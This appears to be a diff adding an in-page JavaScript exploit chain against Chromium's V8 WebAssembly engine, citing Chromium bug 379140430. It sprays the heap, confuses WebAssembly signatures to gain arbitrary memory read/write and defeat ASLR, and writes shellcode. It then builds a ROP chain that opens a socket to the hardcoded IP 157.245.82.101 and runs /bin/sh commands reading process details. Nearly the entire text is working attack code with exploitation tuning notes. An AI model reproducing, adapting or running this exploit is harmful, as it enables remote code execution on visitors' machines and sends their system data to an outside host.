+    const RW_EXP_B64 = 'AGFzbQEAAAABHAVQAF8BfgFgAX4BZABgAX4BfmACfn4AYAF+AX4CEwEGaW1wb3J0CGZ1bmNfZXhwAAEDBAMCAwQECwFAAGQEAQEB0gMLByAEBHJlYWQAAQV3cml0ZQACBXRhYmxlAQAFZHVtbXkAAwojAwoAIAAQAPsCAAALDAAgABAAIAH7BQAACwkAIABBABEEAAsAHARuYW1lARUDAQRyZWFkAgV3cml0ZQMFZHVtbXk=';
+    const RW_SIG_B64 = 'AGFzbQEAAAABBgFgAX4BfgIPAQZpbXBvcnQEZnVuYwAABwwBCGZ1bmNfc2lnAAA=';
+    ensureAnchor('before rw confuse');
+    const rwInst = confuseSig(RW_EXP_B64, RW_SIG_B64, 0, 1);
+
+    function nativeRead(addr) { return BigInt.asUintN(64, rwInst.exports.read(BigInt(addr) - 7n)); }
+    function nativeWrite(addr, value) { rwInst.exports.write(BigInt(addr) - 7n, BigInt(value)); }
+    {
+      const sWalk = nativeRead(nativeLeak);
+      const sTrustedBase = nativeLeak & ~0xffffffffn;
+      const sInstanceOff = (sWalk >> 24n) & 0xffffffffn;
+      if ((sInstanceOff & 3n) !== 1n || sInstanceOff >= 0x100000n) {
+        throw Error('stage16 instance ' + sInstanceOff.toString(16));
+      }
+      const sInstanceTag = sTrustedBase | sInstanceOff;
+      const sDispatchPair = nativeRead((sInstanceTag - 1n) + 8n);
+      const sDispatchOff = (sDispatchPair >> 32n) & 0xffffffffn;
+      if ((sDispatchOff & 3n) !== 1n || sDispatchOff >= 0x100000n) {
+        throw Error('stage16 dispatch ' + sDispatchOff.toString(16));
+      }
+      const sDispatchTag = sTrustedBase | sDispatchOff;
+      const sChain = nativeRead((sInstanceTag - 1n) + 0x18n);
+      if (sChain <= 0x10000n || (sChain & 0xfffn) !== 0n) {
+        throw Error('stage16 memory ' + sChain.toString(16));
+      }
+      // Reuse func_exp entry 0 for the final one-argument handoff.
+      const sTargetAddr = (sDispatchTag - 1n) + 16n;
+      const sTarget = nativeRead(sTargetAddr);
+      if (sTarget <= 0x10000n) throw Error('stage16 target ' + sTarget.toString(16));
+      slog('STAGE16-ARM target=' + sTarget.toString(16) +
+        ' memory=' + sChain.toString(16));
+      // mov rdi,rax; rsi=0x1000; rdx=7; rax=10; syscall; jmp rdi.
+      // Twenty bytes plus four NOPs, using only the first Wasm argument.
+      nativeWrite(sTarget, 0xc1485e016ac78948n);
+      nativeWrite(sTarget + 8n, 0x580a6a5a076a0ce6n);
+      nativeWrite(sTarget + 16n, 0x90909090e7ff050fn);
+      leakInst.exports.leak(sChain);
+      throw Error('stage16 returned');
+    }
+  } catch (e) {
+    slog('NATIVE-ARW-ERR ' + (e && e.stack ? e.stack : String(e)));
+    window.__result = 'NATIVE-ARW-ERR:' + (e && e.stack ? e.stack : String(e));
+    return;
+  }
+
+  // wasm preamble: full cross-instance setup
+  function uleb(n){ const out=[]; n>>>=0; do { let b=n&0x7f; n>>>=7; if(n) b|=0x80; out.push(b);} while(n); return out; }
+  function sleb(n){ const out=[]; let more=true; n|=0;
+    while(more){ let b=n&0x7f; n>>=7; if((n===0&&!(b&0x40))||(n===-1&&(b&0x40))) more=false; else b|=0x80; out.push(b);} return out; }
+  function wstr(s){ const b=[]; for (const c of s) b.push(c.charCodeAt(0)); return [...uleb(b.length), ...b]; }
+  function flatVec(items){ const out=[...uleb(items.length)]; for (const it of items) out.push(...it); return out; }
+  function sec(id, payload){ return [id, ...uleb(payload.length), ...payload]; }
+  const F64=0x7c, I32=0x7f;
+  function tE(p, r){ return [0x60, ...flatVec(p.map(x=>[x])), ...flatVec(r.map(x=>[x]))]; }
+  const NP = parseInt((location.hash.match(/np=(\d+)/) || [0, 30])[1], 10);
+  const Sread  = tE(Array(NP).fill(F64), []);
+  const Swrite = tE([], Array(NP).fill(F64));
+  const Vread  = tE([I32, I32], [I32]);
+  const Vwrite = tE([F64], []);
+  const TfireR = tE([], [I32]);
+  const TfireW = tE([], []);
+  const modA = [0,97,115,109,1,0,0,0,
+    ...sec(1, flatVec([Sread, Swrite])),
+    ...sec(2, flatVec([[...wstr('e'), ...wstr('gr'), 0x00, ...uleb(0)],
+                       [...wstr('e'), ...wstr('wr'), 0x00, ...uleb(1)]])),
+    ...sec(7, flatVec([[...wstr('gr'), 0x00, ...uleb(0)],
+                       [...wstr('wr'), 0x00, ...uleb(1)]]))];
+  function callgBody(){ const b=[]; for (let i=0;i<NP;i++) b.push(0x20, ...uleb(i));
+    b.push(0x41, ...sleb(0), 0x11, ...uleb(0), ...uleb(0), 0x0b); return [0, ...b]; }
+  function callwBody(){ return [0, 0x41, ...sleb(1), 0x11, ...uleb(1), ...uleb(0), 0x0b]; }
+  function fireReadBody(){ return [0, 0x41, ...sleb(0x11111111), 0x41, ...sleb(0x22222222|0), 0x10, ...uleb(2), 0x0b]; }
+  function fireWriteBody(){ return [0, 0x44, 0,0,0,0,0,0,0,0, 0x10, ...uleb(3), 0x0b]; }
+  const modB = [0,97,115,109,1,0,0,0,
+    ...sec(1, flatVec([Sread, Swrite, Vread, Vwrite, TfireR, TfireW])),
+    ...sec(2, flatVec([[...wstr('a'), ...wstr('gr'), 0x00, ...uleb(0)],
+                       [...wstr('a'), ...wstr('wr'), 0x00, ...uleb(1)],
+                       [...wstr('e'), ...wstr('vr'), 0x00, ...uleb(2)],
+                       [...wstr('e'), ...wstr('vw'), 0x00, ...uleb(3)]])),
+    ...sec(3, flatVec([[...uleb(0)],[...uleb(1)],[...uleb(4)],[...uleb(5)]])),
+    ...sec(4, flatVec([[0x70, 0x00, ...uleb(2)]])),
+    ...sec(7, flatVec([[...wstr('callg'), 0x00, ...uleb(4)],
+                       [...wstr('callw'), 0x00, ...uleb(5)],
+                       [...wstr('fire_read'), 0x00, ...uleb(6)],
+                       [...wstr('fire_write'), 0x00, ...uleb(7)],
+                       [...wstr('t'), 0x01, ...uleb(0)]])),
+    ...sec(10, flatVec([callgBody(), callwBody(), fireReadBody(), fireWriteBody()].map(b => [...uleb(b.length), ...b])))];
+  // push old-space bump far above newspace BEFORE instantiation so B/C objects
+  // land high in the cage, reachable by positive index from the corrupted-FDA anchor
+  window.__oldpush = [];
+  for (let i = 0; i < 1400; i++) { const a = new Array(0x2000); a[0] = i; window.__oldpush.push(a); }
+  let vrSeen = null;
+  const gr = function(){ window.__grN = arguments.length; };
+  const wr = function(){ return Array.from({length: NP}, (_,i)=> i); };
+  const vr = function(){ vrSeen = Array.from(arguments, x => { try { f64[0] = x; return (u32[1]>>>0).toString(16) + ':' + (u32[0]>>>0).toString(16); } catch(e){ return String(x); } }); };
+  let vwArgN = -1; let VW_PAYLOAD = null;
+  const vw = function(x){ window.__vwCalled = true; vwArgN = arguments.length; return VW_PAYLOAD || Array.from({length: NP}, (_,i)=> 0); };
+  const instA = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(modA)), {e:{gr, wr}});
+  // in-page warm-up (Phase D gate): cold browsers never confuse until modB
+  // has been compiled several times (wasm compile cache); recompile + run
+  // throwaway tier cycles BEFORE the real pairs so one load suffices.
+  const warmN = parseInt((location.hash.match(/w=(\d+)/) || [0, 4])[1], 10);
+  for (let wi = 0; wi < warmN; wi++) {
+    try {
+      const wm = new WebAssembly.Module(new Uint8Array(modB));
+      const wI = new WebAssembly.Instance(wm, {a:{gr: instA.exports.gr, wr: instA.exports.wr}, e:{vr: function(){}, vw: function(){ return Array.from({length: NP}, () => 0); }}});
+      const agw = Array.from({length: NP}, (_,i)=> 1.5);
+      for (let i = 0; i < 1300; i++) wI.exports.callg.apply(null, agw);
+      for (let i = 0; i < 1300; i++) wI.exports.callw();
+    } catch(e) { }
+  }
+  slog('warm x' + warmN);
+  const modBobj = new WebAssembly.Module(new Uint8Array(modB));
+  const modC = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0]));
+  window.__instB = null; window.__instC = null;
+  slog('pairs-done');
+  // ROP chain + payload: allocated AFTER the pairs preamble so the calibration
+  // heap shape is unchanged (page-start allocation broke the arming layout,
+  // 357 dry loads); the 100k-warmup scavenges promote these to old space well
+  // before arm time, keeping the captured chain address stable.
+  ROPCHAIN = new Array(128);
+  for (let i = 0; i < 128; i++) ROPCHAIN[i] = 1.5;
+  ROPPAY = new Array(96);
+  for (let i = 0; i < 96; i++) ROPPAY[i] = 0;
+
+  // (preamble moved AFTER calibration+prims: on post-02:40 target nodes the
+  // warmup mark-compact packs pre-warmup pairs LOW (0.9MB) below every view
+  // - 6 nopairs; allocating the pairs now keeps them at fresh old-top ABOVE
+  // the already-calibrated view)
+    // re-derive prims AFTER the preamble allocations (K without this returned
+  // one identical stale address for every pair)
+  if (!reAnchor()) {
+    const r6 = calibrate(6);
+    slog('post-preamble recalib att=' + r6);
+    if (r6 < 0 || !reAnchor()) { slog('FAIL:postpreamble ' + JSON.stringify(failN)); window.__result = JSON.stringify({log: LOG.slice(-16)}); return; }
+  }
+  window.__pairs = [];
+  // SPRAY: 24 pairs interleaved with spacing garbage - scavenges during the
+  // burst otherwise reset newspace and strand every pair BELOW the view
+  // (U run 04:42); with spread placement some pair always lands above.
+  for (let pi = 0; pi < 24; pi++) {
+    const pb = new WebAssembly.Instance(modBobj, {a:{gr: instA.exports.gr, wr: instA.exports.wr}, e:{vr, vw}});
+    const pc = new WebAssembly.Instance(modC, {});
+    window.__pairs.push([pb, pc]);
+    pb.exports.t.set(0, instA.exports.gr);
+    pb.exports.t.set(1, instA.exports.wr);
+    const spacer = new Array(2048); spacer[0] = pi;
+  }
+  // (pairs moved AFTER the last recalibration: the corrupted is then the
+  // most-recent young allocation BELOW the freshly allocated pairs)
+    let bAddr = 0, cAddr = 0, pairIdx = -1;
+  const pairAddrs = window.__pairs.map(function(pr){ return [(addrof(pr[0])&~1).toString(16), (addrof(pr[1])&~1).toString(16)]; });
+  for (let pi = 0; pi < window.__pairs.length; pi++) {
+    const pb = addrof(window.__pairs[pi][0]) & ~1;
+    const pc = addrof(window.__pairs[pi][1]) & ~1;
+    if (pb > (viewBaseAbs + 0x2000) && pc > pb && (pc - pb) < 0x4000) {
+      bAddr = pb; cAddr = pc; pairIdx = pi;
+      window.__instB = window.__pairs[pi][0]; window.__instC = window.__pairs[pi][1];
+      break;
+    }
+  }
+  if (pairIdx < 0) {
+    slog('nopair vb=' + viewBaseAbs.toString(16) + ' pairs=' + JSON.stringify(pairAddrs) + ' ok1=' + ok1 + ' ok2=' + ok2);
+    window.__result = JSON.stringify({ ok: ok1 && ok2, pairIdx: pairIdx, log: LOG.slice(-16) });
+    return;
+  }
+  slog('pair i=' + pairIdx + ' b=' + bAddr.toString(16) + ' c=' + cAddr.toString(16) + ' ok1=' + ok1 + ' ok2=' + ok2);
+
+  // ---- critical window: definitions first, then all steps allocation-light ----
+  const want1 = (bAddr | 1) >>> 0;
+  const t0 = [0,0,0,0,0,0,0,0], t1 = [0,0,0,0,0,0,0,0];
+  let n0=0, n1=0, scanned=0;
+  // FIXED elements anchor at the REAL corrupted FDA (valid map passes V8's
+  // elements check); reach targets by INDEX from viewBaseAbs. No retargeting.
+  const lightR = (addr)=>{ return fake[(addr - viewBaseAbs) >>> 3]; };
+  const lightW = (addr, d)=>{ rawStore(fake, (addr - viewBaseAbs) >>> 3, d); };
+  const w32 = (addr, val)=>{
+    const al = addr & ~7;
+    const d = lightR(al);
+    lightW(al, ((addr & 7) === 0) ? mk(val, hi(d)) : mk(lo(d), val));
+  };
+
+  // ±64KB around the chosen pair: the 6 pairs + 12 Tuple2s were allocated in
+  // ONE contiguous old-space burst (~50KB), so this covers all of them while
+  // staying on mapped pages.
+  const CHUNK = 0x2000;
+  const scanLo = (bAddr - 0x10000) >>> 0;
+  const scanHi = (cAddr + 0x10000) >>> 0;
+  {
+    const s = 'scanwin lo=' + scanLo.toString(16) + ' hi=' + scanHi.toString(16) + ' want=' + want1.toString(16) + ' vb=' + viewBaseAbs.toString(16);
+    slog(s);
+  }
+  // NOTE: no mid-exploit awaits — headless tabs FREEZE after a few idle
+  // seconds (25s pause test 15:53: resume timer never fired). All sync now.
+  if (!reAnchor()) {
+    // tier-up GCs scattered the calibration set: re-calibrate (fresh triggers)
+    const r2 = calibrate(4);
+    slog('recalib post-tier att=' + r2);
+    if (r2 < 0 || !reAnchor()) { slog('FAIL:posttier-recalib ' + JSON.stringify(failN)); window.__result = JSON.stringify({log: LOG.slice(-16)}); return; }
+  }
+  {
+    const p0 = fake[(scanLo - viewBaseAbs) >>> 3];
+    slog('probe lo=' + hi(p0).toString(16) + ':' + lo(p0).toString(16) + ' vb=' + viewBaseAbs.toString(16));
+  }
+  scanLoop:
+  for (let base = scanLo; base < scanHi; base += CHUNK) {
+    if (base > scanLo && !reAnchor()) break;
+    let lo2 = base < viewBaseAbs ? viewBaseAbs : base;
+    const hi2 = (base + CHUNK) < scanHi ? base + CHUNK : scanHi;
+    for (let a = lo2; a < hi2 && (n0 < 1 || n1 < 1); a += 8) {
+      scanned++;
+      const d1 = fake[(a - viewBaseAbs) >>> 3];
+      const d2 = fake[((a + 8) - viewBaseAbs) >>> 3];
+      if (hi(d1) === want1) {
+        const w2 = lo(d2) >>> 0;
+        if (w2 === 2 && n0 < 8) t0[n0++] = a;
+        else if (w2 === 4 && n1 < 8) t1[n1++] = a;
+      }
+      if (lo(d2) === want1) {
+        const w2 = hi(d2) >>> 0;
+        if (w2 === 2 && n0 < 8) t0[n0++] = a + 4;
+        else if (w2 === 4 && n1 < 8) t1[n1++] = a + 4;
+      }
+    }
+    if (n0 >= 1 && n1 >= 1) break scanLoop;
+  }
+  slog('E:scan-done n0=' + n0 + ' n1=' + n1 + ' scanned=' + scanned + ' vb=' + viewBaseAbs.toString(16));
+  if (n0 < 1 || n1 < 1) {
+    if (reAnchor()) {
+      let dump = [];
+      for (let i = 0; i < 24; i++) dump.push((lo(lightR(bAddr + i*8))>>>0).toString(16) + '.' + (hi(lightR(bAddr + i*8))>>>0).toString(16));
+      slog('scan-miss b=' + bAddr.toString(16) + ' scanned=' + scanned + ' n0=' + n0 + ' n1=' + n1 + ' dump=' + dump.join(','));
+    } else slog('scan-miss scanned=' + scanned);
+    window.__result = JSON.stringify({log: LOG.slice(-16)});
+    return;
+  }
+  // corrupt the Tuple2 call_origins, then fire each confusion ONCE
+  if (!reAnchor()) {
+    const r3 = calibrate(3);
+    slog('recalib pre-corrupt att=' + r3);
+    if (r3 < 0 || !reAnchor()) { slog('FAIL:precorrupt-recalib ' + JSON.stringify(failN)); window.__result = JSON.stringify({log: LOG.slice(-16)}); return; }
+  }
+  {
+    // Tuple2 = [map(4)][value1(4)][value2(4)]; value2 at +8 regardless of
+    // the object's 8-byte alignment. Read back with matching phase.
+    const rb = (t)=>{ const al = (t + 8) & ~7; const d = lightR(al); return ((t + 8) & 7) === 0 ? lo(d) : hi(d); };
+    w32(t0[0] + 8, (-3 << 1) >>> 0);
+    w32(t1[0] + 8, (-4 << 1) >>> 0);
+    const c0 = (rb(t0[0])>>>0).toString(16), c1 = (rb(t1[0])>>>0).toString(16);
+    slog('corrupt=' + c0 + ',' + c1 + ' t0=' + t0[0].toString(16) + ' t1=' + t1[0].toString(16) +
+         ' b=' + bAddr.toString(16) + ' c=' + cAddr.toString(16));
+  }
+  // TIER-UP with the corruption ACTIVE (the wrapper re-reads the corrupted
+  // Tuple2 origin at tier-up - that IS the confusion, Chromium 379140430).
+  // Tier-onset detection: pre-tier vr receives 2 args (Vread sig), post-tier
+  // 30 (Sread); pre-tier vw receives 1 arg (Vwrite), post-tier 0 (Swrite).
+  // Stop at onset so only a couple of result-smears ever hit the stack.
+  try {
+    const cg = window.__instB.exports.callg, cw = window.__instB.exports.callw;
+    const ag = Array.from({length: NP}, (_,i)=> 1.5);
+    let vrTiered = false;
+    // install window: let pending background wrapper rebuilds land BEFORE the
+    // cw loop (a rebuild landing mid-cw = first post-tier callw smears the
+    // return path and wedges; 21:15-22:15 grids: 0/212 armed without this)
+    await new Promise(r => setTimeout(r, 200));
+    for (let i = 0; i < 8000; i++) {
+      try { cg.apply(null, ag); } catch(e) { slog('cg err ' + i + ': ' + e); break; }
+    }
+    if (vrSeen && vrSeen.length === NP) vrTiered = true;
+    await new Promise(r => setTimeout(r, 100));
+    // cw loop REMOVED: its post-tier callw smears wedge the target renderer
+    // before 'tiered' (V run 04:49 stopped at corrupt). cg + a longer fire
+    // loop drive the shared wrapper rebuild instead.
+    slog('tiered vrTiered=' + vrTiered + ' gr=' + window.__grN + ' vwArgN=' + vwArgN);
+    
+    await new Promise(r => setTimeout(r, 30));
+  } catch (e) { slog('tier: ' + e); }
+  // fire_read itself drives the direct-import wrapper tier-up: loop until the
+  // wrapper rebuilds with the corrupted (Sread) origin - vr then sees 30 args.
+  try {
+    let got = null;
+    slog('frloop-go');
+    for (let i = 0; i < 4000; i++) {
+      vrSeen = null;
+      try { window.__instB.exports.fire_read(); } catch(e) { slog('fr err ' + i + ': ' + e); break; }
+      if ((i % 500) === 0) slog('fr' + i + ' n=' + (vrSeen ? vrSeen.length : -1));
+      if (vrSeen && vrSeen.length === NP) { got = i; break; }
+    }
+    slog('CONFUSED vr args=' + (vrSeen ? vrSeen.length : -1) + ' att=' + got + ' :: ' + (vrSeen ? vrSeen.slice(0, Math.min(NP, 30)).join(',') : 'null'));
+  } catch (e) { slog('fire: ' + e); }
+  // ==== PHASE C: stack-pivot ROP via fire_write ====
+  // leak slot12 = chrome r-xp + 0x40e244a (same-run maps correlation, runA);
+  // PIE base = leak12 - 0x40e244a - 0x2b5d000 (r-xp maps file 0x2b5c000 at vaddr 0x2b5d000)
+  try {
+    if (!vrSeen || vrSeen.length !== NP) { slog('rop: no leak'); }
+    else {
+      const w64 = (str) => { const h = parseInt(str.slice(0, str.indexOf(':')), 16), l = parseInt(str.slice(str.indexOf(':') + 1), 16); return [h, l]; };
+      // PIE derivation with slot-drift self-healing: sweep all leak slots
+      // against the two runA-measured chrome-text constants and accept only
+      // a PAGE-ALIGNED result; majority vote on the high half.
+      const CONSTS = [0x40e244a + 0x2b5d000, 0x406fb93 + 0x2b5d000];
+      const votes = {};
+      let best = null, bestN = 0;
+      for (let si = 0; si < vrSeen.length; si++) {
+        const w = w64(vrSeen[si]);
+        if (w[0] < 0x5000 || w[0] > 0x7000) continue;   // PIE mmap range
+        for (let ci = 0; ci < CONSTS.length; ci++) {
+          let lo2 = (w[1] - CONSTS[ci]) >>> 0;
+          let hi2 = w[0] - (((w[1] < CONSTS[ci]) ? 1 : 0));
+          if ((lo2 & 0xfff) === 0) {
+            const key = hi2.toString(16) + ':' + lo2.toString(16);
+            votes[key] = (votes[key] || 0) + 1;
+          }
+        }
+      }
+      for (const k in votes) if (votes[k] > bestN) { bestN = votes[k]; best = k; }
+      if (!best || bestN < 2) { slog('rop: no pie slot12=' + vrSeen[12] + ' s19=' + vrSeen[19] + ' s0=' + vrSeen[0]); }
+      const bp = best ? best.split(':') : ['0', '0'];
+      const PIEl = parseInt(bp[1], 16) >>> 0;
+      const PIEh = parseInt(bp[0], 16) >>> 0;
+      slog('rop pie=' + PIEh.toString(16) + ':' + PIEl.toString(16) + ' votes=' + bestN + ' L12=' + vrSeen[12] + ' L19=' + vrSeen[19]);
+      const G = (off) => mk((PIEl + off) >>> 0, (PIEh + (((PIEl + off) > 0xffffffff) ? 1 : 0)) >>> 0);
+      // gadget doubles (PIE + vaddr)
+      const POP_RDI = G(0x2c4a2d8), POP_RSI = G(0x2c4ef74), POP_RDX = G(0x2c47482),
+            POP_RAX = G(0x2bd39fc), SYSCALL = G(0x4155417), XCHG = G(0x2bf27e2),
+            POP_RSP = G(0x2b87f96), RET = G(0x2c4a2d9);
+      slog('rop pie=' + PIEh.toString(16) + ':' + PIEl.toString(16));
+      const chain = ROPCHAIN;
+      let ropR = reAnchor();
+      if (!ropR) {
+        const r4 = calibrate(3);
+        slog('rop recalib att=' + r4);
+        ropR = r4 >= 0 && reAnchor();
+      }
+      if (!ropR) { slog('rop: reanchor fail'); }
+      else {
+        const ca = addrof(chain);
+        const hd = arbR64(((ca & ~1) + 8) >>> 0);
+        const fh = b2f(hd);
+        const elems = lo(fh) >>> 0;
+        if ((elems & 1) !== 1) { slog('rop: bad elems ' + elems.toString(16)); }
+        else {
+          // chain data address as [hi,lo] (cage base high half from leak slot9)
+          const C = [parseInt(vrSeen[9].slice(0, vrSeen[9].indexOf(':')), 16), ((elems & ~1) + 8) >>> 0];
+          const CA = (slot) => { const lo2 = (C[1] + slot * 8) >>> 0; const hi2 = C[0] + (((C[1] + slot * 8) > 0xffffffff) ? 1 : 0); return mk(lo2, hi2); };
+          // sockaddr: AF_INET(2) | port 19707 BE | 157.245.82.101
+          const SOCK = mk(0x4d1b0002, 0x6552f59d);
+          const BINSH = mk(0x6e69622f, 0x0068732f); // "/bin/sh\0"
+          const DASHC = mk(0x0000632d, 0);          // "-c\0"
+          const CMD   = mk(0x32206469, 0x0031267e); // "id 2>&1\0"
+          const chainSet = (i, v) => { chain[i] = v; };
+          // chain (executes after pivot; rsp = C data start)
+          let k = 0;
+          chainSet(k++, POP_RDI); chainSet(k++, mk(2, 0));
+          chainSet(k++, POP_RSI); chainSet(k++, mk(1, 0));
+          chainSet(k++, POP_RDX); chainSet(k++, mk(0, 0));
+          chainSet(k++, POP_RAX); chainSet(k++, mk(41, 0));
+          chainSet(k++, SYSCALL);
+          chainSet(k++, XCHG);                       // rdi = fd (runtime value)
+          chainSet(k++, POP_RSI); chainSet(k++, CA(40));
+          chainSet(k++, POP_RDX); chainSet(k++, mk(16, 0));
+          chainSet(k++, POP_RAX); chainSet(k++, mk(42, 0));
+          chainSet(k++, SYSCALL);
+          chainSet(k++, POP_RSI); chainSet(k++, mk(1, 0));
+          chainSet(k++, POP_RAX); chainSet(k++, mk(33, 0));
+          chainSet(k++, SYSCALL);                    // dup2(fd,1)
+          chainSet(k++, POP_RDI); chainSet(k++, CA(41));
+          chainSet(k++, POP_RSI); chainSet(k++, CA(44));
+          chainSet(k++, POP_RDX); chainSet(k++, mk(0, 0));
+          chainSet(k++, POP_RAX); chainSet(k++, mk(59, 0));
+          chainSet(k++, SYSCALL);                    // execve("/bin/sh", argv, 0)
+          chainSet(40, SOCK);
+          chainSet(41, BINSH);
+          chainSet(42, DASHC);
+          // enriched PoC command (single /bin/sh -c, bounded): id, uname,
+          // renderer PID, /proc/self/status ids+ppid, cmdline. Written as
+          // 8-byte doubles from slot 50; argv[2] -> slot 50.
+          const CMDS = 'id; uname -a; echo PID=$$; grep -E "Name|Pid|PPid|Uid|Gid|TracerPid" /proc/self/status; echo CMD:; tr "\\0" "@" </proc/self/cmdline; echo\\u0000';
+          for (let ci2 = 0; ci2 * 8 < CMDS.length; ci2++) {
+            let lo2 = 0, hi2 = 0;
+            for (let b = 0; b < 4; b++) lo2 |= (CMDS.charCodeAt(ci2 * 8 + b) || 0) << (8 * b);
+            for (let b = 0; b < 4; b++) hi2 |= (CMDS.charCodeAt(ci2 * 8 + 4 + b) || 0) << (8 * b);
+            chainSet(50 + ci2, mk(lo2 >>> 0, hi2 >>> 0));
+          }
+          chainSet(44, CA(41)); chainSet(45, CA(42)); chainSet(46, CA(50)); chainSet(47, mk(0, 0));
+          // smear payload: [pop rsp;ret, chainAddr] pairs; #v=1 => leading ret
+          const variant = parseInt((location.hash.match(/v=(\d+)/) || [0, 4])[1], 10);
+          const payload = ROPPAY;
+          // pre-armed beacon (BEFORE any address capture): zero allocations are
+          // allowed between chainAddr capture and fire_write
+          slog('rop arming var=' + variant + ' s=' + ((location.hash.match(/s=(\d+)/) || [0, -1])[1]) + ' p=' + ((location.hash.match(/p=(\d+)/) || [0, -1])[1]) + ' chain@' + C[0].toString(16) + ':' + C[1].toString(16) + ' k=' + k);
+          for (let i = 0; i < NP; i++) payload[i] = mk(0, 0);
+          if (variant === 9) {
+            for (let i = 0; i < NP; i++) payload[i] = mk(i, 0xAAAA00 + (i >> 4));
+          } else if (variant === 3) {
+            const ps = parseInt((location.hash.match(/s=(\d+)/) || [0, 0])[1], 10);
+            if (ps >= 0 && ps < NP) payload[ps] = mk(0x41414141, 0x41414141);
+          } else if (variant === 4) {
+            // TRUE RET-SLED: slots 0..27 = ret gadget, 28 = pop rsp;ret,
+            // 29 = chainAddr. RIP landing anywhere in 0..28 sleds or pivots
+            // to the chain (29/30 coverage vs 15/30 for pivot pairs).
+            for (let i = 0; i < NP; i++) payload[i] = RET;
+            payload[NP - 2] = POP_RSP;
+            payload[NP - 1] = CA(0);
+            slog('sled28');
+          } else {
+            for (let i = 0; i < NP; i++) payload[i] = i % 2 === (variant ? 1 : 0) ? POP_RSP : CA(0);
+            if (variant) payload[0] = RET;
+          }
+          VW_PAYLOAD = payload;
+          try { window.__instB.exports.fire_write(); slog('rop fired'); }
+          catch (e) { slog('rop fire err: ' + e); }
+          slog('rop survived');
+        }
+      }
+    }
+  } catch (e) { slog('rop: ' + e); }
+  window.__result = JSON.stringify({
+    ok: ok1 && ok2, pairIdx: pairIdx,
+    viewBaseAbs: viewBaseAbs.toString(16), el0Off: el0Off, corrOff: corrOff,
+    jsarrMap: jsarrMap.toString(16), ok1: ok1, ok2: ok2, log: LOG.slice(-16)
+  });
+  } catch (e) {
+    window.__result = 'ERR:' + (e && e.stack ? e.stack : String(e));
+    slog('ERR ' + String(e));
+  }
+})();
+</script>
+<img src="/oracle-hold/stage16oneimpdiag.png" style="display:none">
